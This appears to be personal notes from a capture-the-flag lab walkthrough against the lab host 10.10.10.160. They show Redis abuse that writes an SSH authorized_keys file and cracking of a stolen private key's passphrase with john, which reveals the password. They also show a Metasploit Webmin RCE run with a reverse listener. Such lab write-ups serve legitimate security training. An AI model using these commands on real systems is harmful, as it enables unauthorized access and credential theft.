redis-cli -h 10.10.10.160          
10.10.10.160:6379> sudo systemctl restart redis
(error) ERR unknown command 'sudo'
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
knowing this you know where you can write the `authenticated_users` file to access via ssh **with the user redis**. If you know the home of other valid user where you have writable permissions you can also abuse it:

ssh-keygen -t rsa
(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
ssh -i id_rsa redis@10.10.10.160

then we found id_rsa created by Matt:
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak

ssh -i id_rsa.bak Matt@10.10.10.160
Enter passphrase for key 'id_rsa.bak':
we don't have a passphrase so we'll crack it with john

ssh2john id_rsa.bak > id.hash
john --wordlist=/home/kali/Downloads/rockyou.txt id.hash
result:
computer2008
we even don`t need use ssh, we can auth like Matt with use su Matt command

we found vulnerable version webmin and we can exploit it
msf6 exploit(linux/http/webmin_package_updates_rce) > set lhost 10.10.14.15
lhost => 10.10.14.15
msf6 exploit(linux/http/webmin_package_updates_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf6 exploit(linux/http/webmin_package_updates_rce) > set password computer2008
password => computer2008
msf6 exploit(linux/http/webmin_package_updates_rce) > set username Matt
username => Matt
msf6 exploit(linux/http/webmin_package_updates_rce) > show targets
Exploit targets:
    Id  Name
    --  ----
=>  0   Unix In-Memory
    1   Linux Dropper (x86 & x64)
    2   Linux Dropper (ARM64)

msf6 exploit(linux/http/webmin_package_updates_rce) > set target 1
target => 1
msf6 exploit(linux/http/webmin_package_updates_rce) > run
![[Pasted image 20250228131941.png]]
